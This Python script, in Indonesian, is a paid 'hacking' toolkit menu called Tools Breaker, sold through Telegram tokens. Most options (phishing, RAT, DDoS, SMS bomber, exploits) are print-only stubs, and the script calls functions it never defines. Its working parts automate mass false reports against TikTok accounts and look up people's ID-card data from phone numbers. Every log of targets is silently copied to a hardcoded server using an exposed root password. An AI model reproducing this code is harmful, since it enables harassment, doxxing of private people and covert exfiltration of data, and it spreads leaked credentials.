#!/usr/bin/env python3
import os, json, time, uuid, random, string, subprocess, base64, re, requests, sys
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored

# Try to import optional dependencies with fallbacks
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import cryptography
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from PIL import Image
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False

init(autoreset=True)

# ================== CONFIG ==================
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
GITHUB_REPO = "MrFoock12/tools-breaker"
SCRIPT_NAME = "tools_breaker.py"
BACKUP_NAME = "tools_breaker_backup.py"
os.makedirs(RESULTS_DIR, exist_ok=True)

VPS_IP = "209.97.166.25"
VPS_USER = "root"
VPS_PASS = "YOGZVPS#8GB"
VPS_PATH = "/root/korban/results"

# ================== USER INFO ==================
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# ================== MUSIK BRUTAL ==================
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except: pass

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

# ================== DEVELOPER CHECK ==================
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"
IS_DEVELOPER = WHOAMI == DEVELOPER_WHOAMI

# ================== TOKEN SYSTEM ==================
if not os.path.exists(LICENSE_FILE):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({}, f)
    print(colored(f"[AUTO] {LICENSE_FILE} dibuat otomatis!", 'green'))

def load_tokens():
    try: return json.load(open(LICENSE_FILE))
    except: return {}

def save_tokens(t):
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

# ================== DEVELOPER TOKEN CREATION ==================
def create_token():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa buat token!", 'red'))
        return
    
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║         DEVELOPER TOKEN CREATOR         ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    username = input(colored("Username buyer: ", 'yellow')).strip()
    whoami_buyer = input(colored("whoami buyer: ", 'yellow')).strip()
    
    print(colored("Pilih plan:", 'cyan'))
    plans = [
        "pemula 1hari",
        "pemula 1minggu", 
        "pemula 1bulan",
        "pro 1hari",
        "pro 1minggu",
        "pro 1bulan"
    ]
    
    for i, plan in enumerate(plans, 1):
        print(colored(f"    {i}. {plan}", 'white'))
    
    try:
        plan_choice = int(input(colored("Pilih [1-6]: ", 'yellow')).strip())
        selected_plan = plans[plan_choice-1]
    except:
        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
        return
    
    # Calculate expiration
    if "1hari" in selected_plan:
        expires = datetime.now() + timedelta(days=1)
    elif "1minggu" in selected_plan:
        expires = datetime.now() + timedelta(weeks=1)
    elif "1bulan" in selected_plan:
        expires = datetime.now() + timedelta(days=30)
    else:
        expires = datetime.now() + timedelta(days=1)
    
    # Generate token
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    # Save to tokens.json
    tokens = load_tokens()
    tokens[username] = {
        'username': username,
        'token': token,
        'whoami': whoami_buyer,
        'plan': selected_plan,
        'active': True,
        'created': datetime.now().isoformat(),
        'expires': expires.isoformat()
    }
    
    save_tokens(tokens)
    
    print(colored(f"\n[SUCCESS] Token berhasil dibuat!", 'green', attrs=['bold']))
    print(colored(f"   • Username: {username}", 'cyan'))
    print(colored(f"   • Token: {token}", 'cyan'))
    print(colored(f"   • whoami: {whoami_buyer}", 'cyan'))
    print(colored(f"   • Plan: {selected_plan}", 'cyan'))
    print(colored(f"   • Expires: {expires.strftime('%d %b %Y')}", 'cyan'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

def view_tokens():
    if not IS_DEVELOPER:
        print(colored("[ERROR] Hanya developer yang bisa lihat tokens!", 'red'))
        return
    
    tokens = load_tokens()
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║           TOKENS.JSON VIEWER            ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))
    
    if not tokens:
        print(colored("   Tidak ada token tersimpan!", 'yellow'))
    else:
        for username, data in tokens.items():
            status = "AKTIF" if data.get('active', False) else "NONAKTIF"
            expires = datetime.fromisoformat(data['expires']).strftime('%d %b %Y')
            print(colored(f"   • {username}: {data['plan']} | {status} | Exp: {expires}", 'white'))
    
    input(colored("\nTekan Enter untuk kembali...", 'yellow'))

# ================== VALIDASI TOKEN (ANTI SHARE!) ==================
def validate_token(username, token):
    t = load_tokens()
    if username not in t:
        return None
    user = t[username]
    if not user['active'] or user['token'] != token:
        return None
    if datetime.now() > datetime.fromisoformat(user['expires']):
        user['active'] = False
        save_tokens(t)
        return None
    current_whoami = subprocess.getoutput("whoami")
    if user['whoami'] != current_whoami:
        return None
    return user

# ================== LOGIN SYSTEM ==================
def login():
    os.system('clear')
    print(colored("""
╔═════════════════════════════════════════╗
║            TOOLS BREAKER v2.2           ║
╚═════════════════════════════════════════╝
""", 'magenta', attrs=['bold']))

    # Check dependencies first
    check_dependencies()

    # DEVELOPER MODE - Skip login if developer
    if IS_DEVELOPER:
        print(colored("   [DEVELOPER MODE DETECTED!]", 'green', attrs=['bold']))
        print(colored("   • Logged in as: u0_a197", 'cyan'))
        print(colored("   • Access: FULL DEVELOPER PRIVILEGES", 'cyan'))
        print()
        
        print(colored("   [DEVELOPER] Login @uo_a197", 'yellow'))
        print(colored("   Enter...", 'yellow'))
        print()
        
        print(colored("   [1] Masuk Tools", 'white'))
        print(colored("   [2] Buat Token", 'white')) 
        print(colored("   [3] Lihat tokens.json", 'white'))
        
        choice = input(colored("   Pilih: ", 'yellow')).strip()
        
        if choice == "2":
            create_token()
            return login()
        elif choice == "3":
            view_tokens()
            return login()
        elif choice == "1" or choice == "":
            # Continue as developer with dummy credentials
            return "developer_u0_a197", "DEVELOPER LIFETIME"
        else:
            return login()

    # NORMAL USER LOGIN
    print(colored("   • Gunakan token dari @MrFoock12", 'yellow'))
    print(colored("   • Plan: PEMULA / PRO ", 'cyan'))
    print(colored("   • Support: t.me/MrFoock12", 'white'))
    print()

    username = input(colored("   [USERNAME]: ", 'yellow')).strip()
    token = input(colored("   [TOKEN]: ", 'yellow')).strip()

    if not username or not token:
        print(colored("\n[ERROR] Username & Token wajib diisi!", 'red', attrs=['bold']))
        input("\nEnter untuk coba lagi...")
        return login()

    user_data = validate_token(username, token)
    if not user_data:
        print(colored("\n[ERROR] Token Lu Salah Goblok / kadaluarsa / whoami tidak cocok!", 'red', attrs=['bold']))
        print(colored("   • Beli token: @MrFoock12/+62895622994489", 'yellow'))
        input("\nEnter untuk coba lagi...")
        return login()

    # SUCCESS LOGIN
    plan = user_data['plan']
    expires = user_data['expires'][:10]
    print(colored(f"\n[SUCCESS] Login berhasil!", 'green', attrs=['bold']))
    print(colored(f"   • ID: {username.upper()}", 'cyan'))
    print(colored(f"   • Plan: {plan}", 'cyan'))
    print(colored(f"   • Expired: {expires}", 'cyan'))
    print(colored(f"   • whoami: {user_data['whoami']}", 'cyan'))
    input("\nTekan Enter untuk masuk menu...")
    return username, plan

# ================== BANNER ELITE ==================
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
       ╔════════════════════════════════════╗
       ║         TOOLS BREAKER v2.2         ║
       ╚════════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
GitHub: {GITHUB_REPO}
""", None))

# ================== SAVE + SYNC VPS ==================
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED] {filename}", 'green'))
    try:
        subprocess.run(f"sshpass -p '{VPS_PASS}' scp -o StrictHostKeyChecking=no {filepath} {VPS_USER}@{VPS_IP}:{VPS_PATH}/{filename}",
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(colored(f"[SYNC] → {VPS_IP}", 'cyan'))
    except:
        print(colored("[SYNC] Gagal → tetap lokal", 'red'))

# ================== OPTIMIZED FEATURES ==================
def fitur_1():  # PHISING
    os.system('clear'); print(colored("\n[1] PHISING & SOCIAL ENG — 100+ TEMPLATE!", 'cyan', attrs=['bold']))
    target = input(colored("Target: ", 'yellow')).strip()
    template = input(colored("Template: ", 'yellow')).strip().lower()
    print(colored(f"[GENERATE] Link untuk {target}", 'green')); save_result("phising.log", f"Target: {target}")
    input("\nEnter...")

def fitur_2():  # RAT
    os.system('clear'); print(colored("\n[2] RAT & REMOTE ACCESS!", 'cyan', attrs=['bold']))
    if not CRYPTO_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: cryptography", 'yellow'))
        print(colored("   Install: pip install cryptography", 'white'))
        input("\nEnter...")
        return
    
    ip = input(colored("IP Target: ", 'yellow')).strip()
    print(colored(f"[CONNECT] ke {ip}", 'green')); save_result("rat.log", f"IP: {ip}")
    input("\nEnter...")

def fitur_15():  # MASS BANNED TIKTOK
    os.system('clear'); print(colored("\n[15] MASS BANNED TIKTOK!", 'red', attrs=['bold']))
    
    if not SELENIUM_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: selenium", 'yellow'))
        print(colored("   Install: pip install selenium webdriver-manager", 'white'))
        input("\nEnter...")
        return
    
    file_path = input(colored("File target.txt: ", 'yellow')).strip() or "target.txt"
    if not os.path.exists(file_path): print(colored("[ERROR] File tidak ada!", 'red')); input(); return

    with open(file_path, 'r') as f:
        targets = [line.strip().lstrip('@') for line in f if line.strip()]

    total = len(targets)
    print(colored(f"\n[REAL] Mass banned {total} akun...", 'cyan'))
    save_result("mass_banned.log", f"Targets: {total}")

    try:
        from selenium.webdriver.chrome.options import Options
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
        print(colored("   [OK] Selenium ready!", 'green'))
    except Exception as e:
        print(colored(f"[ERROR] Selenium: {e}", 'red')); input(); return

    success = 0
    for idx, user in enumerate(targets):
        print(colored(f"\n[{idx+1}/{total}] @{user}...", 'yellow'))
        try:
            driver.get(f"https://www.tiktok.com/@{user}"); time.sleep(3)
            driver.find_element(By.XPATH, "//button[contains(text(), 'Report')]").click(); time.sleep(1)
            reason = random.choice(["spam", "harassment", "nudity", "violence"])
            driver.find_element(By.XPATH, f"//button[contains(text(), '{reason}')]").click(); time.sleep(1)
            driver.find_element(By.XPATH, "//button[contains(text(), 'Submit')]").click(); time.sleep(1)
            print(colored("   [SUCCESS]", 'green')); success += 1
        except: print(colored("   [FAILED]", 'red'))

    driver.quit()
    print(colored(f"\n[MASS BAN SELESAI] Berhasil: {success}/{total}", 'cyan'))
    input("\nEnter...")

# ================== SIMPLIFIED OTHER FEATURES ==================
def fitur_3():  # DDOS
    os.system('clear'); print(colored("\n[3] DDOS & STRESSER!", 'cyan', attrs=['bold']))
    target = input(colored("URL/IP: ", 'yellow')).strip()
    durasi = input(colored("Durasi (s): ", 'yellow')).strip()
    print(colored(f"[ATTACK] {target} → {durasi}s", 'red')); save_result("ddos.log", f"Target: {target}")
    input("\nEnter...")

def fitur_4():  # BOMBER
    os.system('clear'); print(colored("\n[4] BOMBER TOOLS!", 'cyan', attrs=['bold']))
    nomor = input(colored("Nomor: ", 'yellow')).strip()
    jumlah = input(colored("Jumlah: ", 'yellow')).strip()
    print(colored(f"[BOMB] {nomor} → {jumlah}x", 'green')); save_result("bomber.log", f"Target: {nomor}")
    input("\nEnter...")

def fitur_5():  # OSINT
    os.system('clear'); print(colored("\n[5] OSINT & TRACKING!", 'cyan', attrs=['bold']))
    nama = input(colored("Nama: ", 'yellow')).strip()
    print(colored(f"[SCAN] {nama}", 'green')); save_result("osint.log", f"Nama: {nama}")
    input("\nEnter...")

def fitur_6():  # DEEPFAKE
    os.system('clear'); print(colored("\n[6] DEEPFAKE & AI!", 'cyan', attrs=['bold']))
    if not PILLOW_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: pillow", 'yellow'))
        print(colored("   Install: pip install pillow", 'white'))
        input("\nEnter...")
        return
    foto = input(colored("Foto: ", 'yellow')).strip()
    print(colored(f"[GENERATE] Deepfake selesai!", 'green')); save_result("deepfake.log", f"Foto: {foto}")
    input("\nEnter...")

def fitur_7():  # ENCRYPT
    os.system('clear'); print(colored("\n[7] ENCRYPT & DECRYPT!", 'cyan', attrs=['bold']))
    if not CRYPTO_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: cryptography", 'yellow'))
        print(colored("   Install: pip install cryptography", 'white'))
        input("\nEnter...")
        return
    file = input(colored("File: ", 'yellow')).strip()
    mode = input(colored("e/d: ", 'yellow')).strip().lower()
    print(colored(f"[{mode.upper()}] {file}", 'green')); save_result("encrypt.log", f"File: {file}")
    input("\nEnter...")

def fitur_8():  # EXPLOIT
    os.system('clear'); print(colored("\n[8] EXPLOIT & 0DAY!", 'cyan', attrs=['bold']))
    cve = input(colored("CVE: ", 'yellow')).strip()
    print(colored(f"[EXPLOIT] {cve}", 'red')); save_result("exploit.log", f"CVE: {cve}")
    input("\nEnter...")

def fitur_9():  # UNDANGAN WA
    os.system('clear'); print(colored("\n[9] KIRIM UNDANGAN GRUP WA!", 'cyan', attrs=['bold']))
    nomor = input(colored("Nomor: ", 'yellow')).strip()
    link = input(colored("Link: ", 'yellow')).strip()
    print(colored(f"[KIRIM] ke {nomor}", 'green')); save_result("undangan.log", f"Target: {nomor}")
    input("\nEnter...")

def fitur_10():  # NOTIF
    os.system('clear'); print(colored("\n[10] NOTIF — PUSAT BANTUAN!", 'cyan', attrs=['bold']))
    print(colored("   • Update: v2.2 - Simple & Clean", 'white'))
    print(colored("   • Support: @MrFoock12", 'white'))
    print(colored("   • GitHub: https://github.com/MrFoock12/toolsbreaker", 'white'))
    print(colored("   • Install semua dependencies:", 'cyan'))
    print(colored("     pip install -r requirements.txt", 'white'))
    input("\nEnter...")

def fitur_11():  # DEVTOOLS
    os.system('clear'); print(colored("\n[11] DEVTOOLS!", 'cyan', attrs=['bold']))
    if not IS_DEVELOPER: 
        print(colored("   Akses ditolak!", 'red'))
    else: 
        print(colored("   [DEVELOPER MENU]", 'green', attrs=['bold']))
        print(colored("   1. Buat Token Baru", 'white'))
        print(colored("   2. Lihat Semua Token", 'white'))
        print(colored("   3. Keluar", 'white'))
        
        choice = input(colored("   Pilih [1-3]: ", 'yellow')).strip()
        if choice == "1":
            create_token()
        elif choice == "2":
            view_tokens()
        elif choice == "3":
            manual_update()
    input("\nEnter...")

def fitur_14():  # PHONE NUMBER INFO
    os.system('clear'); print(colored("\n[14] PHONE NUMBER INFO!", 'red', attrs=['bold']))
    nomor = input(colored("Nomor (+62): ", 'yellow')).strip()
    nomor_api = nomor[1:] if nomor.startswith('0') else (nomor[3:] if nomor.startswith('+62') else nomor)
    save_result("phone_info.log", f"Target: {nomor}")

    print(colored("\n[1] CEK KTP...", 'yellow'))
    try:
        r = requests.get(f"https://api.ktp.appvidlab.com/ktp?nik={nomor_api}", timeout=10)
        if r.status_code == 200:
            data = r.json().get('results', {}).get('realtime_data', {}).get('data', {})
            if data:
                print(colored(f"   • Nama: {data.get('nama')}", 'green'))
                print(colored(f"   • NIK: {data.get('nik')}", 'green'))
                print(colored(f"   • Alamat: {data.get('kecamatan')}, {data.get('kabupaten')}, {data.get('provinsi')}", 'green'))
            else: print(colored("   • Data KTP tidak ditemukan", 'red'))
        else: print(colored("   • Gagal cek KTP", 'red'))
    except: print(colored("   • ERROR", 'red'))

    print(colored("\n[2] CEK PROVIDER...", 'yellow'))
    try:
        r = requests.get(f"https://hlrlookup.com/api/v1/lookup?number={nomor}", timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(colored(f"   • Provider: {data.get('operator')}", 'green'))
        else: print(colored("   • Provider tidak ditemukan", 'red'))
    except: print(colored("   • ERROR", 'red'))

    input("\nEnter...")

# ================== MENU UTAMA ==================
def menu_utama(username, plan):
    os.system('clear'); play_music(); print_banner(username, plan)

    print(colored("╔══════════════════════════════════════════════════════════════╗", 'cyan', attrs=['bold']))
    print(colored("║                       < MENU UTAMA v2.2 >                    ║", 'cyan', attrs=['bold']))
    print(colored("╚══════════════════════════════════════════════════════════════╝", 'cyan', attrs=['bold']))
    
    # Show feature status
    features = [
        ("1  PHISING & SOCIAL ENG", "Aktif", 'white'),
        ("2  RAT & REMOTE ACCESS", "Aktif" if CRYPTO_AVAILABLE else "Need Crypto", 'green' if CRYPTO_AVAILABLE else 'yellow'),
        ("3  DDOS & STRESSER", "Aktif", 'white'),
        ("4  BOMBER TOOLS", "Aktif", 'white'),
        ("5  OSINT & TRACKING", "Aktif", 'white'),
        ("6  DEEPFAKE & AI", "Aktif" if PILLOW_AVAILABLE else "Need Pillow", 'green' if PILLOW_AVAILABLE else 'yellow'),
        ("7  ENCRYPT & DECRYPT", "Aktif" if CRYPTO_AVAILABLE else "Need Crypto", 'green' if CRYPTO_AVAILABLE else 'yellow'),
        ("8  EXPLOIT & 0DAY", "Aktif", 'white'),
        ("9  KIRIM UNDANGAN GRUP WA", "Aktif", 'white'),
        ("10 DASHBOARD MONITORING", "Aktif", 'white'),
        ("11 DEVTOOLS", "Aktif", 'white'),
        ("14 PHONE NUMBER INFO", "Aktif", 'white'),
        ("15 MASS BANNED TIKTOK", "Aktif" if SELENIUM_AVAILABLE else "Need Selenium", 'green' if SELENIUM_AVAILABLE else 'yellow')
    ]
    
    for feature, status, color in features:
        print(colored(f"║ {feature:<35} {status:<20} ║", color))
    
    if IS_DEVELOPER:
        print(colored("║13  CEK NOMOR + MUTASI 30 HARI   DEV ONLY                  ║", 'red', attrs=['bold']))
    print(colored("║ 0  EXIT                             Aktif                    ║", 'red'))
    print(colored("╚══════════════════════════════════════════════════════════════╝", 'cyan', attrs=['bold']))

    ch = input(colored("\nPilih [1-15 / 0]: ", 'yellow')).strip()

    feature_map = {
        "1": fitur_1, "2": fitur_2, "3": fitur_3, "4": fitur_4, "5": fitur_5,
        "6": fitur_6, "7": fitur_7, "8": fitur_8, "9": fitur_9, "10": fitur_10,
        "11": fitur_11, "14": fitur_14, "15": fitur_15
    }
    
    if ch in feature_map:
        feature_map[ch]()
    elif ch == "0": 
        sys.exit(0)
    else: 
        print(colored("Pilihan tidak valid!", 'red')); input("Enter...")

    menu_utama(username, plan)

# ================== JALANKAN ==================
if __name__ == "__main__":
    # Auto-check for updates on startup
    check_for_updates()
    
    if not os.path.exists('ua.txt'):
        print(colored("Buat ua.txt dulu! Isi 5-10 User-Agent!", 'red'))
        sys.exit(1)

    # LOGIN DULU!
    username, plan = login()

    # MASUK MENU
    menu_utama(username, plan)
